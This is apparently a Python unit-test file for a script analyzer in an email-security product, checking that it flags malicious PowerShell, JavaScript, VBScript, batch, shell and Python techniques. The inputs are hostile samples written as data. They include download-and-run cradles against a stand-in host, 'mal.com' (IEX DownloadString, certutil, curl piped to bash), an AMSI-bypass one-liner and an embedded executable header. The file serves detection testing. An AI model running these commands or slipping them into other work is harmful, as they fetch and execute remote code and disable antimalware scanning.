import unittest
import base64
from SecureMail.services.atae.analyzers.script import ScriptAnalyzer
from SecureMail.services.atae.core.context import AnalysisContext
from SecureMail.services.atae.core.exceptions import ATAEParserError

class TestScriptAnalyzer(unittest.TestCase):
    def test_powershell_encoded_command(self):
        data = b"powershell.exe -EncodedCommand " + base64.b64encode(b"IEX (New-Object Net.WebClient).DownloadString('http://mal.com')")
        ctx = AnalysisContext("job1", "", "test.ps1", "text/plain")
        analyzer = ScriptAnalyzer()
        findings = analyzer.analyze(data, ctx)
        techs = [f.technique_id for f in findings]
        self.assertIn("PS_OBFUSCATION", techs)
        self.assertIn("PS_IEX", techs)
        self.assertIn("SCRIPT_OBFUSCATION", techs)
        
    def test_powershell_amsi(self):
        data = b"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
        ctx = AnalysisContext("job2", "", "test.ps1", "text/plain")
        analyzer = ScriptAnalyzer()
        findings = analyzer.analyze(data, ctx)
        techs = [f.technique_id for f in findings]
        self.assertIn("PS_AMSI_BYPASS", techs)

    def test_javascript_eval_wsh(self):
        data = b"eval('var shell = new ActiveXObject(\\'WScript.Shell\\'); shell.Run(\\'calc.exe\\');')"
        ctx = AnalysisContext("job3", "", "test.js", "text/javascript")
        analyzer = ScriptAnalyzer()
        findings = analyzer.analyze(data, ctx)
        techs = [f.technique_id for f in findings]
        self.assertIn("JS_DYNAMIC_EXECUTION", techs)
        self.assertIn("JS_WSH", techs)

    def test_vbscript_createobject(self):
        data = b"Set objShell = CreateObject(\"WScript.Shell\")\nobjShell.Run \"cmd.exe /c calc.exe\""
        ctx = AnalysisContext("job4", "", "test.vbs", "text/plain")
        analyzer = ScriptAnalyzer()
        findings = analyzer.analyze(data, ctx)
        techs = [f.technique_id for f in findings]
        self.assertIn("VBS_EXECUTION", techs)

    def test_batch_powershell(self):
        data = b"@echo off\npowershell -ExecutionPolicy Bypass -File malware.ps1\ncertutil -urlcache -split -f http://mal.com/malware.exe malware.exe"
        ctx = AnalysisContext("job5", "", "test.bat", "text/plain")
        analyzer = ScriptAnalyzer()
        findings = analyzer.analyze(data, ctx)
        techs = [f.technique_id for f in findings]
        self.assertIn("BAT_POWERSHELL", techs)
        self.assertIn("BAT_DOWNLOAD", techs)

    def test_shell_curl(self):
        data = b"#!/bin/bash\ncurl -s http://mal.com/bot | bash"
        ctx = AnalysisContext("job6", "", "test.sh", "text/plain")
        analyzer = ScriptAnalyzer()
        findings = analyzer.analyze(data, ctx)
        techs = [f.technique_id for f in findings]
        self.assertIn("SH_NETWORK", techs)
        self.assertIn("SH_EXECUTION", techs)

    def test_python_exec_subprocess(self):
        data = b"import subprocess\nexec('subprocess.Popen([\"ls\", \"-la\"])')"
        ctx = AnalysisContext("job7", "", "test.py", "text/x-python")
        analyzer = ScriptAnalyzer()
        findings = analyzer.analyze(data, ctx)
        techs = [f.technique_id for f in findings]
        self.assertIn("PY_DYNAMIC_EXECUTION", techs)
        self.assertIn("PY_SUBPROCESS", techs)

    def test_nested_base64_embedded_executable(self):
        mz = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00\xb8\x00\x00\x00"
        b64_mz = base64.b64encode(mz)
        data = b"$var = '" + b64_mz + b"'\n[System.Convert]::FromBase64String($var)"
        ctx = AnalysisContext("job8", "", "test.ps1", "text/plain")
        analyzer = ScriptAnalyzer()
        findings = analyzer.analyze(data, ctx)
        techs = [f.technique_id for f in findings]
        self.assertIn("SCRIPT_EMBEDDED_EXECUTABLE", techs)

    def test_malformed_scripts(self):
        # Even if malformed, statically we just scan it
        data = b"function() { return [[[,,, ; ; ;"
        ctx = AnalysisContext("job9", "", "test.js", "text/javascript")
        analyzer = ScriptAnalyzer()
        findings = analyzer.analyze(data, ctx)
        # Should gracefully return no major findings but run successfully
        self.assertEqual(len(findings), 0)

if __name__ == "__main__":
    unittest.main()
